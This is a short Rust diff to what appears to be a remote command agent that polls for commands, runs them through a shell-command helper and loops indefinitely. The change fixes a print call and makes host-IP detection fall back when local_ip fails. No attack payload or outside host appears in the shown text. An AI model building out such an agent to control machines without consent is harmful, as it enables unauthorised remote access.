@@ -110,7 +110,7 @@ fn get_commands(identifier:&str) -> bool {
         if cmd.eq("ERROR"){
             return false
         }
-        print(format!("{}: {}",cmd_id,cmd));
+        print(&format!("{}: {}",cmd_id,cmd));
         handle_command(cmd_id,&cmd,identifier);
     }
     true
@@ -269,13 +269,22 @@ fn main_loop(identifier:&str) -> Result<String,String>{
 }
 
 fn main(){
-    let mut host_ip = local_ip().unwrap().to_string();
+    let mut host_ip = match local_ip(){
+        Ok(ip)=>{
+            ip.to_string()
+        }, Err(_)=>{
+            "127.0.0.1".to_string()
+        }
+    };
     //if its loopback, get the ip from a bash command
-    if host_ip.eq("127.0.0.1"){
-        let ip = run_command("ifconfig | grep -o \"192.168.253.[1,2,3,4,5,6,7,8,9][1,2,3,4,5,6,7,8,9]\" | head -n 1");
-        host_ip = ip.to_string();
-    }
     loop{
+        if host_ip.eq("127.0.0.1"){
+            let ip = run_command("ifconfig | grep 'inet ' | head -n 1 | awk '{print $2}'");
+            host_ip = ip.to_string();
+            if host_ip.eq("") {
+                host_ip = "0.0.0.0".to_string(); //if the ip is still empty, set it to 0.0.0.0 (default)
+            }
+        }
         let identifier = get_id(&host_ip);
         match main_loop(&identifier){
             Ok(_)=>{
